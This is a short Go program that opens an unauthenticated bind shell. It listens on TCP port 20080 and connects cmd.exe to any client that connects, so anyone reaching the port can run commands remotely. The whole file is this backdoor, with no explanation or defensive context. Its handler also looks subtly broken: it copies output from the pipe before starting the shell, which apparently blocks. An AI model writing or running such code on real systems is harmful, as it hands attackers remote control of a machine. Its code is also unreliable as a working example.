package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)


func handle(conn net.Conn) {
	cmd:=exec.Command("cmd.exe")
	rp, wp:=io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	io.Copy(conn,rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}
	log.Println("Listening...")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		log.Println("Accepted connection")

		go handle(conn)
	}
}